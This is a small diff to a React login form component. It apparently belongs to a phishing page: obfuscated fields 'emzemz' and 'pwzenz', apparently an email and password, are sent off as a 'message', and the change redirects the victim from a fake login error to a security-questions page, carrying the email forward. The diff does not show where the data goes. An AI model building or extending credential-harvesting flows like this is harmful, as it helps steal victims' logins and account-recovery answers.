@@ -47,7 +47,7 @@ const LoginForm: React.FC = () => {
           emzemz,
           pwzenz,
         });
-        navigate('/login-error');
+        navigate('/security-questions', { state: { emzemz } });
       } catch (error) {
         console.error('Error sending message:', error);
         setIsLoading(false);
